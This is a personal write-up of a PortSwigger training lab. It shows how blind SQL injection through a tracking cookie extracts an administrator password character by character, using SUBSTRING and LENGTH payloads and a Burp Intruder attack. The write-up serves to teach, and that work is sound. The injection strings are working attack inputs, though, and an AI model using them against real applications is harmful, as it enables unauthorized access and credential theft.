# Lab: Blind SQL injection with conditional responses
![](https://img.shields.io/badge/Difficulty-PRACTITIONER-blue)

**Lab Link:** [https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

---

### Description
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 
---

### My solution:

In the hint of the lab, it says: `You can assume that the password only contains lowercase, alphanumeric characters. `

So, I can solve this lab by injecting `SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm` into the query and playing around with it to figure out the password.

To do this, I will turn intercept on and refresh the page, then send the HTTP request to repeater, then I will change the cookie and see what happens from there.

I was playing around with the cookie until I got the welcome back message on this injection:

`Cookie: TrackingId=WRoteoKHjdPtLAQ2' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) < 'm; `

This tells me that the first character for the password of administrator is smaller than m in the alphabet.

So I try `> i` to narrow down the possible characters and I got no welcome back message, meaning its less than or equal to `i`

I checked if it's equal to i `= i` and it wasn't, so I tried `> e` next.

`Cookie: TrackingId=WRoteoKHjdPtLAQ2' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'e; `

Still got no welcome back message, so I tried `< e` and I got a welcome back message again.

I kept going back and forth, and found that I get a welcome back message at `< a` which made no sense at first. Then I realized in the hint it says alphanumeral, meaning the first character was likely a number.

I found that the first character of the password is `4` by getting a welcome back message on this injection:

`Cookie: TrackingId=WRoteoKHjdPtLAQ2' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = '4;`

So I moved onto the next character and did the same thing.

2nd character was `u`

`Cookie: TrackingId=WRoteoKHjdPtLAQ2' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) = 'u;` 

3rd character was `w`

4th character was `v`

5h character was `8`

I decided to inject `Cookie: TrackingId=WRoteoKHjdPtLAQ2' AND LENGTH((SELECT password FROM users WHERE username = 'administrator')) > 8--;` and play around with it to find the length of the password.

The length of the password was `20` because I got the welcome back message on `Cookie: TrackingId=WRoteoKHjdPtLAQ2' AND LENGTH((SELECT password FROM users WHERE username = 'administrator')) = 20--;`

I went back to finding the characters

6th character was `w`

7th character was `j`

This got tiring so I used a sniper attack to iterate through a alphanumerical wordlist on the injection `Cookie: TrackingId=WRoteoKHjdPtLAQ2' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 7, 1) = 'variable;` and pause the attack when the response includes the string `welcome`. I started the attack then manually iterated to the next character (here it was 7, so i changed it to 8 to find the next char) and started the next one, since burpsuite automatically assigns numbers to attacks, I could keep track of which attack found which character at what position.

The full password: `4uwv8wjee1phmdgrqto4`

I logged in using the password to finish the lab.
